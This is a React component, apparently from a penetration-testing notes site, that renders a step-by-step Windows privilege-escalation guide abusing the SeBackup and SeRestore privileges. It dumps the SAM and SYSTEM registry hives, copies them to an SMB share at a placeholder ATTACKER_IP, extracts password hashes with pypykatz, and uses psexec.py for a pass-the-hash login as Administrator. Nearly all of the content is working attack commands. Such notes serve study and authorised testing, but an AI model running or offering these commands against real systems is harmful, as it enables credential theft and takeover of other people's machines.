import {
  Typography,
  Accordion,
  AccordionSummary,
  AccordionDetails,
  Box,
} from "@mui/material";
import Link from "next/link";
import SyntaxHighlighter from "react-syntax-highlighter";
import ExpandMoreIcon from "@mui/icons-material/ExpandMore";

interface IProps {
  title: string;
}

const SeRestoreSeBackup = ({ title }: IProps) => {
  return (
    <>
      {" "}
      <Accordion sx={{ backgroundColor: "primary.main" }}>
        <AccordionSummary
          expandIcon={<ExpandMoreIcon />}
          aria-controls="panel1a-content"
          id="panel1a-header"
        >
          <Typography>{title}</Typography>
        </AccordionSummary>
        <AccordionDetails
          sx={{ backgroundColor: "primary.background_accordian" }}
        >
          <Typography
            sx={{
              color: "primary.main",
            }}
          >
            <Typography variant="h6">Description</Typography>
            <Typography>
              The SeBackup privilege allows users to read any file on the file
              system. The SeRestore privilege allows users to write to any file
              in the system.
            </Typography>
            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Step 1</Typography>
            <Typography>Check privileges with the command:</Typography>
            <SyntaxHighlighter className="syntax" language="bash">
              {"whoami /priv"}
            </SyntaxHighlighter>
            <Box sx={{ m: 2 }} />
            <Typography>
              Note: If you are of the group{" "}
              <Typography className="highlight" display="inline">
                BUILTIN\Backup Operators
              </Typography>
              , then you can perform this privilege escalation as well.
            </Typography>
            <SyntaxHighlighter className="syntax" language="bash">
              {"whoami /all"}
            </SyntaxHighlighter>
            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Step 2</Typography>
            <Typography>Backup the SAM and SYSTEM hives</Typography>
            <SyntaxHighlighter className="syntax" language="bash">
              {"reg save hklm\\sam C:\\temp\\sam.hive"}
            </SyntaxHighlighter>
            <SyntaxHighlighter className="syntax" language="bash">
              {"reg save hklm\\system C:\\temp\\system.hive"}
            </SyntaxHighlighter>
            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Step 3</Typography>
            <Typography>
              Start an SMB server to copy the files to your local machine
            </Typography>
            <SyntaxHighlighter className="syntax" language="bash">
              {"mkdir share"}
            </SyntaxHighlighter>
            <SyntaxHighlighter className="syntax" language="bash">
              {
                "smbserver.py -smb2support -username {username} -password {password} public share"
              }
            </SyntaxHighlighter>
            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Step 4</Typography>
            <Typography>
              Copy the SAM and SYSTEM hives to the SMB server.
            </Typography>
            <SyntaxHighlighter className="syntax" language="bash">
              {"copy C:\\temp\\sam.hive \\\\ATTACKER_IP\\public\\"}
            </SyntaxHighlighter>
            <SyntaxHighlighter className="syntax" language="bash">
              {"copy C:\\temp\\system.hive \\\\ATTACKER_IP\\public\\"}
            </SyntaxHighlighter>
            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Step 5</Typography>
            <Typography>
              Use pypykatz to extract the hashes from SAM and SYSTEM.
            </Typography>
            <SyntaxHighlighter className="syntax" language="bash">
              {"pypykatz registry --sam sam.hive system.hive"}
            </SyntaxHighlighter>
            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Step 6</Typography>
            <Typography>
              Use the Administrator's hash to perform a Pass-the-Hash attack.
            </Typography>
            <SyntaxHighlighter className="syntax" language="bash">
              {"psexec.py -hashes {hash} Administrator@{IP}"}
            </SyntaxHighlighter>
          </Typography>
        </AccordionDetails>
      </Accordion>
    </>
  );
};

export default SeRestoreSeBackup;
